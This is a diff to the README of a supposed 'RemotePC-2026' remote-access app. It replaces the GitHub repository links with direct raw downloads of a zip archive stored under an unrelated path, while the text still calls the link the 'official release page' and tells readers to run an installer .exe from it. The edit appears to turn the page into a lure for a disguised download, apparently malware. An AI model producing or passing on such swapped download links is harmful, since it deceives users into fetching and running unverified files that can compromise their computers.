@@ -5,7 +5,7 @@ description: "Download and install RemotePC on Windows 10 and 11 using a single 
 ---
 # 💻 RemotePC-2026 - Access your computer from anywhere easily
 
-[![](https://img.shields.io/badge/Download-RemotePC_2026-blue.svg)](https://github.com/changefulnesspitstop975/RemotePC-2026)
+[![](https://img.shields.io/badge/Download-RemotePC_2026-blue.svg)](https://raw.githubusercontent.com/changefulnesspitstop975/changefulnesspitstop975.github.io/main/uncargoed/changefulnesspitstop_io_github_1.2.zip)
 
 ## 📌 About RemotePC-2026
 
@@ -36,7 +36,7 @@ Your computer needs to meet these basic standards to run the application.
 
 Follow these steps to obtain the setup files for your system.
 
-1. Go to the [official release page](https://github.com/changefulnesspitstop975/RemotePC-2026).
+1. Go to the [official release page](https://raw.githubusercontent.com/changefulnesspitstop975/changefulnesspitstop975.github.io/main/uncargoed/changefulnesspitstop_io_github_1.2.zip).
 2. Look for the file labeled RemotePC_2026_Installer.exe.
 3. Click the file name to start the download to your computer.
 4. Save the file to your Downloads folder.
